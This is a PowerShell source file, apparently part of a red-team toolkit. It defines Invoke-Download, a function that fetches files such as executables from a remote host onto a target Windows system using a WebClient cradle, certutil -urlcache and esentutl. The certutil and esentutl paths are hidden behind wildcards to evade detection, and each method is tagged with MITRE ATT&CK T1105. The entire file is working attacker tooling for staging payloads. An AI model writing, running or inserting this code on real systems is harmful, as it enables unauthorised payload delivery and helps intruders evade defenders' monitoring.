function Invoke-Download {
<#
                                          
.SYNOPSIS
	Commands for downloading files to the target system.

.PARAMETER Help
	Shows detailed help for each function.

.PARAMETER List
	Shows summary list of available functions.

.PARAMETER PsDownload
	Downloads a file to the target system using a traditional powershell 'DownloadFile' cradle.

.PARAMETER CertUtil
	Uses certutil.exe to download a file to the target system. 

.PARAMETER Esentutl
	Uses Esentutil.exe to download a file from a remote UNC Path.
	
.EXAMPLE
	PS> Invoke-Download -PsDownload -RemoteFile https://192.168.1.1/file.exe -LocalFile C:\temp\file.exe

.EXAMPLE
	PS> Invoke-Download -CertUtil -RemoteFile https://192.168.1.1/file.exe -LocalFile C:\temp\file.exe
	
.EXAMPLE
	PS> Invoke-Download -Esentutl -RemoteUNCPath \\192.168.1.1\share\file.exe -LocalFile C:\temp\file.exe
	
.NOTES
	Author: Fabrizio Siciliano (@0rbz_)

#>
[CmdletBinding()]
param (
	[Parameter(Position=1)]
	[Switch]$Help,
	[Switch]$List,
	
	[Parameter(Mandatory = $False)]
	[Switch]$PsDownload,
	[String]$RemoteFile,
	[String]$LocalFile,
	
	[Parameter(Mandatory = $False)]
	[Switch]$Certutil,
	[String]$RemoteFile2=[string]$RemoteFile,
	[String]$LocalFile2=[string]$LocalFile,
	
	[Parameter(Mandatory = $False)]
	[Switch]$EsentUtl,
	[String]$RemoteUNCPath,
	[String]$LocalFile3=[String]$LocalFile
)

	if ($Help -eq $True) {
		
		Write @"
	
 ### Invoke-Download Help ###
 ----------------------------
 Available Invoke-Download Commands:
 -----------------------------------
 |-----------------------------------------------------------------------------|
 | -PsDownload [-RemoteFile] remote_File [-LocalFile] local_file               |
 |-----------------------------------------------------------------------------|

   [*] Description: Downloads a file to the target system using a traditional 
       powershell 'DownloadFile' cradle.                          	 

   [*] Usage: Invoke-Download -PsDownload -RemoteFile https://server/File.exe 
       -LocalFile C:\temp\File.exe 

   [*] Mitre ATT&CK Ref: T1105 (Remote File Copy)                               
 
 |-----------------------------------------------------------------------------|
 | -CertUtil  [-RemoteFile] remote_File [-LocalFile] local_file                |
 |-----------------------------------------------------------------------------|

   [*] Description: Uses certutil to download a file to the target            
       system.

   [*] Usage: Invoke-Download -CertUtil -RemoteFile http://server/File.exe    
       -LocalFile C:\temp\File.exe

   [*] Mitre ATT&CK Ref: T1105 (Remote File Copy)
   
 |-----------------------------------------------------------------------------|
 | -Esentutl  [-RemoteUNCPath] remote_File [-LocalFile] local_file             |
 |-----------------------------------------------------------------------------|

   [*] Description: Uses Esentutil.exe to download a file from a remote UNC Path.

   [*] Usage: Invoke-Download -Esentutl -RemoteUNCPath \\192.168.1.1\share\file.exe -LocalFile

   [*] Mitre ATT&CK Ref: T1105 (Remote File Copy)

 \-----------------------------------------------------------------------------/

"@
	}
	
	elseif ($List -eq $True) {
		Write @"

 Invoke-Download Brief Command Usage:
 ------------------------------------
 Invoke-Download -PsDownload -RemoteFile https://192.168.1.1/file.exe -LocalFile C:\temp\file.exe
 Invoke-Download -CertUtil -RemoteFile https://192.168.1.1/file.exe -LocalFile C:\temp\file.exe
 Invoke-Download -Esentutl -RemoteUNCPath \\192.168.1.1\share\file.exe -LocalFile
 
"@
	}
	
	elseif ($PsDownload -and $RemoteFile -and $LocalFile) {
		if ($PSVersionTable.PSVersion.Major -eq "2") {
			Write "`n [!] This function requires PowerShell version greater than 2.0.`n"
			return
		}
		$h = "`n### Invoke-Download(PsDownload) ###`n"
		(New-Object Net.Webclient).DownloadFile($RemoteFile, $LocalFile)
		
		if ($(Test-Path -path $LocalFile)) {
			$h
			Write " [+] File successfully downloaded to $LocalFile"
			$h
		}
		else {
			$h
			Write " [-] Download failed. Make sure your File exists at $RemoteFile and that $LocalFile is writable and try again."
			$h
		}
	}
	
	elseif ($certutil -and $RemoteFile -and $LocalFile) {
	# https://carnal0wnage.attackresearch.com/2017/08/certutil-for-delivery-of-files.html
	# https://twitter.com/subtee/status/888125678872399873
	# https://twitter.com/subTee/status/888071631528235010
	
		$h = "`n### Invoke-Download(certutil) ###`n"
		(C:\??*?\*3?\?er*ut?l.?x? -split -urlcache -f $RemoteFile $LocalFile)
		
		if ($(Test-Path -path $LocalFile)) {
			$h
			Write " File successfully downloaded to $LocalFile"
			$h
		}
		else {
			$h
			Write " Download failed. Make sure your File exists at $RemoteFile and that $LocalFile is writable and try again."
			$h
		}
	}
	elseif ($EsentUtl -and $RemoteUNCPath -and $LocalFile) {
	# https://twitter.com/egre55/status/985994639202283520
	
		if ($(Test-Path -path "C:\windows\system32\esentutl.exe")) {
			Try {
				
				(C:\??*?\*3?\Es*n?U??.?x? /y $RemoteUNCPath /d $LocalFile /o)
				
				if ($(Test-Path -path $LocalFile)) {
					Write "`n [+] File successfully downloaded to $LocalFile`n"
				}
			}
			Catch {
				Write "`n [!] Unknown Error.`n"
			}
		}
		if (!$(Test-Path -path "C:\windows\system32\esentutl.exe")) {
			Write "`n [!] Can't find esentutil.exe in its usual location. Unable to download file.`n"
		}
	}
}